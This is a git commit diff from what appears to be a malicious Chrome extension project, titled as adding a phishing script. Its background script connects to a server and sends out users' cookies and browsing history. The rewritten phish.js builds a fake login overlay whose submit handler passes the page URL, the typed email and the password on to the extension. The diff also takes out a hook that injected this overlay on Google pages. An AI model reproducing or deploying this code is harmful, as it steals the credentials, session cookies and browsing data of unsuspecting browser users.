2a6c92a06c8595b7995767d66f4f2c133c9bc9f6
Nicholas Shaw <35937378+nishaw303@users.noreply.github.com>
2018-12-02 19:44:57 -0500

    Added a simple phishing script and fixed loginListener

--- extension/js/background.js
+++ extension/js/background.js
@@ -1,6 +1,6 @@
 chrome.runtime.onInstalled.addListener(() => {
   connectToServer();
-  searchAndSendHistory();
+  //searchAndSendHistory();
   createScriptListener();
   chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
       checkAndSendCookies(info);
@@ -11,16 +11,9 @@ chrome.runtime.onInstalled.addListener(() => {
   chrome.history.onVisited.addListener((page) => {
     sendHistoryPage(page);
   });
-  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-    if (changeInfo.url) {
-      if (changeInfo.url.includes("google")) {
-        chrome.tabs.executeScript(tabId, {
-          file: "/js/phish.js"
-        });
-      }
-    }
+  chrome.alarms.create("updater", {
+    periodInMinutes: 1
   });
-  chrome.alarms.create("updater", {periodInMinutes: 1});
   chrome.alarms.onAlarm.addListener(() => {
     updateSecurityWebsites(socket);
     updateScriptWebsites(socket);
--- extension/js/phish.js
+++ extension/js/phish.js
@@ -1,70 +1,53 @@
-<script>
-info="
-<html>
+var div = document.createElement("div");
+div.setAttribute("style", "display: block; position: fixed; z-index: 1; padding-top: 100px; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.4);");
+div.setAttribute("id", "loginBox");
+var innerDiv = document.createElement("div");
+innerDiv.setAttribute("style", "text-align: center; background-color: #fefefe; margin: auto; padding: 20px; border: 1px solid #888; width: 10%;");
+var headerDiv = document.createElement("div");
+var header = document.createElement("h1");
+header.appendChild(document.createTextNode("Login"));
+var emailDiv1 = document.createElement("div");
+var label1 = document.createElement("label");
+label1.setAttribute("for", "pEmail");
+label1.appendChild(document.createTextNode("Email"));
+var emailDiv2 = document.createElement("div");
+var input1 = document.createElement("input");
+input1.setAttribute("id", "pEmail");
+input1.setAttribute("type", "text");
+input1.setAttribute("placeholder", "Enter Email");
+input1.setAttribute("name", "pEmail");
+var pswDiv1 = document.createElement("div");
+var label2 = document.createElement("label");
+label2.setAttribute("for", "psw");
+label2.appendChild(document.createTextNode("Password"));
+var pswDiv2 = document.createElement("div");
+var input2 = document.createElement("input");
+input2.setAttribute("id", "pPsw");
+input2.setAttribute("type", "password");
+input2.setAttribute("placeholder", "Enter Password");
+input2.setAttribute("name", "pPsw");
+var buttonDiv = document.createElement("div");
+var submitButton = document.createElement("button");
+submitButton.setAttribute("onclick", "submitFunction");
+submitButton.appendChild(document.createTextNode("Login"));
 
-<head>
-  <meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;>
-  <style>
-    body {font-family: Arial, Helvetica, sans-serif;}
-
-/* The Modal (background) */
-.modal {
-    display: none; /* Hidden by default */
-    position: fixed; /* Stay in place */
-    z-index: 1; /* Sit on top */
-    padding-top: 100px; /* Location of the box */
-    left: 0;
-    top: 0;
-    width: 100%; /* Full width */
-    height: 100%; /* Full height */
-    overflow: auto; /* Enable scroll if needed */
-    background-color: rgb(0,0,0); /* Fallback color */
-    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
-}
-
-/* Modal Content */
-.modal-content {
-    background-color: #fefefe;
-    margin: auto;
-    padding: 20px;
-    border: 1px solid #888;
-    width: 80%;
-}
-
-</style>
-</head>
-
-<body>
-  <div id=&#34;myModal&#34; class=&#34;modal&#34;>
-
-    <!-- Modal content -->
-    <div class=&#34;modal-content&#34;>
-      <form action=&#34;/action_page.php&#34; class=&#34;form-container&#34;>
-        <h1>Login</h1>
-
-        <label for=&#34;email&#34;><b>Email</b></label>
-        <input type=&#34;text&#34; placeholder=&#34;Enter Email&#34; name=&#34;email&#34; required>
-
-        <label for=&#34;psw&#34;><b>Password</b></label>
-        <input type=&#34;password&#34; placeholder=&#34;Enter Password&#34; name=&#34;psw&#34; required>
-
-        <button type=&#34;submit&#34; class=&#34;btn&#34;>Login</button>
-      </form>
-    </div>
-
-  </div>
-
-  <script>
-    // Get the modal
-    var modal = document.getElementById(&#39;myModal&#39;);
-
-    modal.style.display = &#34;block&#34;;
-  </script>
-
-</body>
-
-</html>
-"
-
-document.write(info)
-</script>
+headerDiv.appendChild(header);
+emailDiv1.appendChild(label1);
+emailDiv2.appendChild(input1);
+pswDiv1.appendChild(label2);
+pswDiv2.appendChild(input2);
+buttonDiv.appendChild(submitButton);
+innerDiv.appendChild(headerDiv);
+innerDiv.appendChild(emailDiv1);
+innerDiv.appendChild(emailDiv2);
+innerDiv.appendChild(pswDiv1);
+innerDiv.appendChild(pswDiv2);
+innerDiv.appendChild(buttonDiv);
+div.appendChild(innerDiv);
+document.body.appendChild(div);
+function submitFunction() {
+  chrome.runtime.sendMessage({
+    loginListener: location.href + ' ' + input1.value + ":" + input2.value
+  });
+	document.getElementById('loginBox').style.display = "none";
+};
